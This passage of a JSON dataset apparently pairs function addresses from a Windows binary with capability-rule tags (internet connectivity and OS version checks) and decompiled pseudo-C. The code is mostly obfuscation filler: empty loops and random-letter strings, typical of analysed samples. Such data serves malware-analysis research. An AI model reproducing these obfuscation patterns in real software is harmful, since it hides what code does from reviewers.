            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0041ab20(uint arg_8h, uint arg_ch)\n\n{\n    uint var_68h;\n    uint var_64h;\n    uint var_5ch;\n    uint var_54h;\n    uint var_39h;\n    ulong uStack52;\n    ulong uStack44;\n    uchar var_1bh;\n    uchar var_1ah;\n    uint var_19h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    stack0xffffffe4 = *0x522af0;\n    var_19h._0_1_ = 0;\n    var_1ah = 1;\n    var_1bh = 1;\n    uStack44 = *0x522af8;\n    fcn.00483110();\n    fcn.004b21e0(\"tttgtczikcbvhmygij\", &var_39h);\n    fcn.00483140();\n    uStack52 = *0x522b00;\n    stack0xffffffc4 = *0x522b08;\n    for (var_ch = 0x1b; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.004b2800();\n    return 0x7175;\n}\n",
        "token_count": 307
    },
    "0041abda": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.0041abda(uint noname_0, uint noname_1, uint noname_2, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h, uint arg_2ch, uint arg_30h, uint noname_11, uint arg_38h)\n\n{\n    uint in_ECX;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_49h;\n    ulong uStack68;\n    ulong uStack60;\n    uint var_2ch;\n    ulong uStack44;\n    uint var_19h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    stack0xffffffe4 = *0x522b10;\n    var_19h._0_1_ = 1;\n    uStack44 = *0x522b18;\n    var_2ch = 0x817;\n    uStack60 = *0x522b20;\n    uStack68 = *0x522b28;\n    stack0xffffffb4 = *0x522b30;\n    for (var_ch = 0x39; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    for (var_10h = 0x40; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(0x519e1c, &var_49h);\n    fcn.00483140();\n    return in_ECX;\n}\n",
        "token_count": 460
    },
    "0041af0c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0041af0c(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint arg_18h, uint arg_1ch)\n\n{\n    char cVar1;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_bch;\n    uint var_ach;\n    uint var_94h;\n    uint var_7ch;\n    uint var_63h;\n    uint var_45h;\n    uchar var_2bh;\n    uchar var_2ah;\n    uint var_29h;\n    ulong uStack36;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    uStack36 = *0x522b50;\n    fcn.00483110();\n    fcn.004b21e0(\"ljrgpdxjzyfsb\", &var_63h);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"ukgrfsfputmwumclbikrhxrhru\", &var_63h + 1);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"tybajpbzobozkzyksjeisqsenxqgxdazdtwinchyybnpgysd\", &var_63h + 2);\n    fcn.00483140();\n    stack0xffffffd4 = *0x522b58;\n    var_29h._0_1_ = 1;\n    var_2ah = 1;\n    fcn.00483110();\n    fcn.004b21e0(\"tybajpbzobozkzyksjeisqsenxqgxdazdtwinchyybnpgysd\", &var_45h);\n    fcn.00483110();\n    fcn.004b21e0(\"tybajpbzobozkzyksjeisqsenxqgxdazdtwinchyybnpgysd\", &var_2bh);\n    cVar1 = fcn.004c09a0(&var_45h + 1, &var_63h + 3);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 9; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    for (var_10h = 0x1a; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    for (var_14h = 0x1a; 0 < var_14h; var_14h = var_14h + -1) {\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    return 1;\n}\n",
        "token_count": 718
    },
    "0041b15c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __cdecl\nfcn.0041b15c(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint noname_5, uint arg_20h, \n            uint arg_24h)\n\n{\n    char cVar1;\n    uint in_ECX;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_ach;\n    uint var_91h;\n    uint var_75h;\n    uint var_59h;\n    uint var_3dh;\n    uchar var_22h;\n    uchar var_21h;\n    uint var_20h;\n    uchar var_19h;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_18h = 0x146e;\n    var_19h = 1;\n    var_20h = 0x7b3;\n    fcn.00483110();\n    fcn.004b21e0(\"hhuaupyjcgranquuhfbhyokdfodzjybvvvltabrnuukrxvxvnvrjdbzikaaadjlkjsucfjsuvqrzexfuppa\", &var_91h);\n    fcn.00483140();\n    for (var_ch = 0x56; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"hhuaupyjcgranquuhfbhyokdfodzjybvvvltabrnuukrxvxvnvrjdbzikaaadjlkjsucfjsuvqrzexfuppa\", &var_75h);\n    fcn.00483110();\n    fcn.004b21e0(\"hhuaupyjcgranquuhfbhyokdfodzjybvvvltabrnuukrxvxvnvrjdbzikaaadjlkjsucfjsuvqrzexfuppa\", &var_59h);\n    cVar1 = fcn.004c1070(&var_75h + 1, &var_91h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_10h = 0x47; 0 < var_10h; var_10h = var_10h + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"hhuaupyjcgranquuhfbhyokdfodzjybvvvltabrnuukrxvxvnvrjdbzikaaadjlkjsucfjsuvqrzexfuppa\", &var_3dh);\n    fcn.00483110();\n    fcn.004b21e0(\"hhuaupyjcgranquuhfbhyokdfodzjybvvvltabrnuukrxvxvnvrjdbzikaaadjlkjsucfjsuvqrzexfuppa\", &var_22h);\n    cVar1 = fcn.004c1070(&var_3dh + 1, &var_59h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_14h = 0x27; 0 < var_14h; var_14h = var_14h + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(0x51d688, &var_21h);\n    fcn.00483140();\n    fcn.004b2800();\n    return in_ECX;\n}\n",
        "token_count": 921
    },
    "0041b420": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __cdecl fcn.0041b420(uint noname_0, uint arg_ch, uint noname_2, uint arg_14h)\n\n{\n    char cVar1;\n    uint var_154h;\n    uint var_150h;\n    uint var_14ch;\n    uint var_13ch;\n    uint var_124h;\n    uint var_10ah;\n    uint var_edh;\n    uint var_d1h;\n    uint var_b5h;\n    uint var_99h;\n    uint var_7dh;\n    uint var_61h;\n    uint var_45h;\n    uint var_29h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"auxvwmoerbtrhnfwnaryolhlofjftdbfamcpxbdmydleefmjoborlhflsxgaziki\", &var_10ah);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"nqvqhiljwwlqdeagpivvqaiiqhvskdsdkjwhfmagaaktvogyodfkqqaxzkfnlbcohrimfesytxm\", &var_10ah + 1);\n    fcn.00483140();\n    stack0xffffffd4 = *0x522b60;\n    for (var_ch = 0x24; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"nqvqhiljwwlqdeagpivvqaiiqhvskdsdkjwhfmagaaktvogyodfkqqaxzkfnlbcohrimfesytxm\", &var_edh);\n    fcn.00483110();\n    fcn.004b21e0(\"nqvqhiljwwlqdeagpivvqaiiqhvskdsdkjwhfmagaaktvogyodfkqqaxzkfnlbcohrimfesytxm\", &var_d1h);\n    cVar1 = fcn.004c1070(&var_edh + 1, &var_10ah + 2);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_10h = 0x1f; 0 < var_10h; var_10h = var_10h + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"nqvqhiljwwlqdeagpivvqaiiqhvskdsdkjwhfmagaaktvogyodfkqqaxzkfnlbcohrimfesytxm\", &var_b5h);\n    fcn.00483110();\n    fcn.004b21e0(\"nqvqhiljwwlqdeagpivvqaiiqhvskdsdkjwhfmagaaktvogyodfkqqaxzkfnlbcohrimfesytxm\", &var_99h);\n    cVar1 = fcn.004c1070(&var_b5h + 1, &var_d1h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_14h = 0x55; 0 < var_14h; var_14h = var_14h + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"nqvqhiljwwlqdeagpivvqaiiqhvskdsdkjwhfmagaaktvogyodfkqqaxzkfnlbcohrimfesytxm\", &var_7dh);\n    fcn.00483110();\n    fcn.004b21e0(\"nqvqhiljwwlqdeagpivvqaiiqhvskdsdkjwhfmagaaktvogyodfkqqaxzkfnlbcohrimfesytxm\", &var_61h);\n    cVar1 = fcn.004c09a0(&var_7dh + 1, &var_99h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_18h = 0x4c; 0 < var_18h; var_18h = var_18h + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"auxvwmoerbtrhnfwnaryolhlofjftdbfamcpxbdmydleefmjoborlhflsxgaziki\", &var_45h);\n    fcn.00483110();\n    fcn.004b21e0(\"auxvwmoerbtrhnfwnaryolhlofjftdbfamcpxbdmydleefmjoborlhflsxgaziki\", &var_29h);\n    cVar1 = fcn.004c09a0(&var_45h + 1, &var_61h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_1ch = 0x2d; 0 < var_1ch; var_1ch = var_1ch + -1) {\n        }\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    return 0;\n}\n",
        "token_count": 1387
    },
    "0041b8da": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __cdecl fcn.0041b8da(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint in_ECX;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_64h;\n    uint var_4ah;\n    uint var_3ch;\n    ulong uStack60;\n    ulong uStack52;\n    uint var_24h;\n    uchar var_1dh;\n    uint var_1ch;\n    ulong uStack28;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    uStack28 = *0x522b68;\n    var_1ch = 0x3a0;\n    var_1dh = 0;\n    var_24h = 0x5b;\n    fcn.00483110();\n    fcn.004b21e0(\"hctsrttzzunfmgoxukwtwtxopbzitdbqvlsacufetaqbgqjmdyqdlgtlmb\", &var_4ah);\n    fcn.00483140();\n    uStack52 = *0x522b70;\n    uStack60 = *0x522b78;\n    var_3ch = 0x688;\n    stack0xffffffb4 = *0x522b80;\n    for (var_ch = 100; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"prcft\", &var_4ah + 1);\n    fcn.00483140();\n    fcn.004b2800();\n    return in_ECX;\n}\n",
        "token_count": 405
    },
    "0041b9f4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0041b9f4(void)\n\n{\n    uint var_14h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    for (var_4h = 0x51; 0 < var_4h; var_4h = var_4h + -1) {\n    }\n    return;\n}\n",
        "token_count": 79
    },
    "0041cc0e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041cc0e(uint noname_0, uint arg_ch)\n\n{\n    uint var_60h;\n    uint var_5ch;\n    uint var_4ch;\n    uint var_31h;\n    uint var_21h;\n    uint var_18h;\n    int32_t var_11h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"krmhmbwbjkpohgaxlsthinbqpuleiylyuglfqytcpxlhdxvepvvlhevfqtjgcjkkbcztjsgsdtjsbbflciwzwfhqhfgchmqjhzme\"\n                 , &var_31h);\n    fcn.00483140();\n    var_11h._0_1_ = 1;\n    var_18h = 0x76e;\n    stack0xffffffdc = *0x522c78;\n    var_21h._0_1_ = 1;\n    stack0xffffffcc = *0x522c80;\n    for (var_ch = 0x5f; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    for (stack0xffffffec = 0x1f; 0 < stack0xffffffec; unique0x00007a80 = stack0xffffffec + -1) {\n    }\n    fcn.004b2800();\n    return;\n}\n",
        "token_count": 358
    },
    "0041ccc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __cdecl\nfcn.0041ccc0(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint noname_7, uint arg_28h, uint arg_2ch)\n\n{\n    uint in_ECX;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_2ch;\n    uchar var_1ah;\n    uchar var_19h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_10h = 0x12e8;\n    var_14h = 0x19b5;\n    var_18h = 0xb19;\n    var_19h = 1;\n    for (var_ch = 0x22; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"lhnzqsauakrubjnee\", &var_1ah);\n    fcn.00483140();\n    return in_ECX;\n}\n",
        "token_count": 333
    },
    "0041cd78": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nfloat10 __cdecl fcn.0041cd78(uint arg_8h, uint arg_ch)\n\n{\n    double dVar1;\n    uint var_88h;\n    uint var_84h;\n    uint var_7ch;\n    uint var_70h;\n    uint var_58h;\n    uint var_40h;\n    uint var_28h;\n    uint var_24h;\n    ulong uStack36;\n    uchar var_11h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_10h = 0x18c6;\n    var_11h = 1;\n    fcn.00483110();\n    fcn.004b21e0(\"xmuvnpdrnbrzjjhzeogkoajlbudfzjrvesoxgyyzifzhv\", &var_28h);\n    fcn.00483140();\n    uStack36 = *0x522c88;\n    fcn.00483110();\n    fcn.004b21e0(\"dsgiv\", &var_28h + 1);\n    fcn.00483140();\n    var_24h = 0x338;\n    fcn.00483110();\n    fcn.004b21e0(\"xvwmjtrwsnpymhmswfnzdpofgsuboltnebgvpbjwmdzlkphtfuqqqoosrgzpuhdbglvujlne\", &var_28h + 2);\n    fcn.00483140();\n    dVar1 = *0x522c90;\n    var_28h._3_1_ = 1;\n    for (var_ch = 0x43; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    return dVar1;\n}\n",
        "token_count": 446
    },
    "0041cff0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0041cff0(uint param_1)\n\n{\n    char cVar1;\n    uint var_fch;\n    uint var_ech;\n    uint var_d4h;\n    uint var_bch;\n    uint var_a3h;\n    uint var_85h;\n    uint var_69h;\n    uint var_4dh;\n    uchar var_34h;\n    uchar var_33h;\n    uchar var_32h;\n    uint var_31h;\n    ulong uStack44;\n    uchar var_1eh;\n    uchar var_1dh;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_1ch = 0x7c9;\n    var_1dh = 0;\n    fcn.00483110();\n    fcn.004b21e0(\"docayfrbpvvrghynshyexqitvbleiurafonpxqarxyeujklflqgwhmprpfyoabtrakdizufzdanfbebx\", &var_a3h);\n    fcn.00483140();\n    var_1eh = 0;\n    uStack44 = *0x522ca8;\n    stack0xffffffcc = *0x522cb0;\n    var_31h._0_1_ = 1;\n    fcn.00483110();\n    fcn.004b21e0(\"bmaavuagebmftubqadyeeuqnnxvwaaqfmmnjwvkaefzcehzvyipoulzadnjyroxkvferusztfbmihtpfaldkuat\", &var_a3h + 1\n                );\n    fcn.00483140();\n    var_32h = 0;\n    fcn.00483110();\n    fcn.004b21e0(\"ngpfqjpr\", &var_a3h + 2);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"bmaavuagebmftubqadyeeuqnnxvwaaqfmmnjwvkaefzcehzvyipoulzadnjyroxkvferusztfbmihtpfaldkuat\", &var_85h);\n    fcn.00483110();\n    fcn.004b21e0(\"bmaavuagebmftubqadyeeuqnnxvwaaqfmmnjwvkaefzcehzvyipoulzadnjyroxkvferusztfbmihtpfaldkuat\", &var_69h);\n    cVar1 = fcn.004c1070(&var_85h + 1, &var_a3h + 3);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 0x41; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"bmaavuagebmftubqadyeeuqnnxvwaaqfmmnjwvkaefzcehzvyipoulzadnjyroxkvferusztfbmihtpfaldkuat\", &var_4dh);\n    fcn.00483110();\n    fcn.004b21e0(\"bmaavuagebmftubqadyeeuqnnxvwaaqfmmnjwvkaefzcehzvyipoulzadnjyroxkvferusztfbmihtpfaldkuat\", &var_34h);\n    cVar1 = fcn.004c09a0(&var_4dh + 1, &var_69h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_10h = 0x3d; 0 < var_10h; var_10h = var_10h + -1) {\n        }\n    }\n    for (var_14h = 6; 0 < var_14h; var_14h = var_14h + -1) {\n    }\n    for (var_18h = 0x41; 0 < var_18h; var_18h = var_18h + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"rtbmmyakrmcjijr\", &var_33h);\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    return param_1;\n}\n",
        "token_count": 1138
    },
    "0041d392": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041d392(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    uint var_28h;\n    uint var_24h;\n    uint var_14h;\n    int32_t var_4h;\n    \n    for (var_4h = 6; 0 < var_4h; var_4h = var_4h + -1) {\n    }\n    return 0xf7aa;\n}\n",
        "token_count": 105
    },
    "0041d3ce": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __cdecl\nfcn.0041d3ce(uint noname_0, uint noname_1, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint noname_7, uint arg_28h)\n\n{\n    uint in_ECX;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uchar var_29h;\n    uint var_28h;\n    uint var_24h;\n    ulong uStack36;\n    ulong uStack28;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_10h = 0xb0e;\n    uStack28 = *0x522cc0;\n    uStack36 = *0x522cc8;\n    var_24h = 0x124f;\n    var_28h = 0x1ab;\n    for (var_ch = 0x42; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(0x51df89, &var_29h);\n    fcn.00483140();\n    return in_ECX;\n}\n",
        "token_count": 331
    },
    "0041d590": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.0041d590(uint arg_8h, uint noname_1, uint noname_2, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    char cVar1;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c4h;\n    uint var_ach;\n    uint var_94h;\n    uint var_7bh;\n    uint var_5dh;\n    uint var_41h;\n    uchar var_32h;\n    uint var_31h;\n    uint var_24h;\n    ulong uStack36;\n    int32_t var_15h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_15h._0_1_ = 1;\n    uStack36 = *0x522ce8;\n    var_24h = 0x9ef;\n    fcn.00483110();\n    fcn.004b21e0(\"vutuayxopnhudzvqsbyrvkoeuceesryqorlazfbjkuxrkdeblnxhiglsgyltrgikrpukneotidvrpypwvlpa\", &var_7bh);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"geopsqlrdngtvgyhwa\", &var_7bh + 1);\n    fcn.00483140();\n    stack0xffffffcc = *0x522cf0;\n    var_31h._0_1_ = 1;\n    fcn.00483110();\n    fcn.004b21e0(\"gpczf\", &var_7bh + 2);\n    fcn.00483140();\n    var_32h = 0;\n    stack0xffffffbc = *0x522cf8;\n    for (var_ch = 0x35; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    for (var_10h = 0x19; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"gpczf\", &var_5dh);\n    fcn.00483110();\n    fcn.004b21e0(\"gpczf\", &var_41h);\n    cVar1 = fcn.004c1070(&var_5dh + 1, &var_7bh + 3);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (stack0xffffffe8 = 0x29; 0 < stack0xffffffe8; unique0x00007a80 = stack0xffffffe8 + -1) {\n        }\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    return 0;\n}\n",
        "token_count": 771
    },
    "0041d824": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.0041d824(void)\n\n{\n    uint var_44h;\n    uint var_34h;\n    uint var_19h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    for (var_4h = 0x5b; 0 < var_4h; var_4h = var_4h + -1) {\n    }\n    for (var_8h = 0x2e; 0 < var_8h; var_8h = var_8h + -1) {\n    }\n    for (var_ch = 0x45; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    return 0;\n}\n",
        "token_count": 170
    },
    "0041def8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0041def8(void)\n\n{\n    uint var_6ch;\n    uint var_60h;\n    uint var_45h;\n    ulong uStack68;\n    uint var_38h;\n    uint var_31h;\n    ulong uStack44;\n    uint var_1ch;\n    ulong uStack28;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    uStack28 = *0x522d70;\n    var_1ch = 0x145f;\n    uStack44 = *0x522d78;\n    fcn.00483110();\n    fcn.004b21e0(\"opagvjdnopsrfkeqdfiksngdoyecqoyxgziisuqhobnvvpowrxgmxyuzthatekpkprfujfacurejiftfbbviukilyvmapiheec\", \n                 &var_45h);\n    fcn.00483140();\n    stack0xffffffcc = *0x522d80;\n    var_31h._0_1_ = 0;\n    var_38h = 0x81f;\n    uStack68 = *0x522d88;\n    stack0xffffffb8 = 0xa2c;\n    for (var_ch = 0x44; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.004b2800();\n    return 0x89f6;\n}\n",
        "token_count": 347
    },
    "0041e010": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
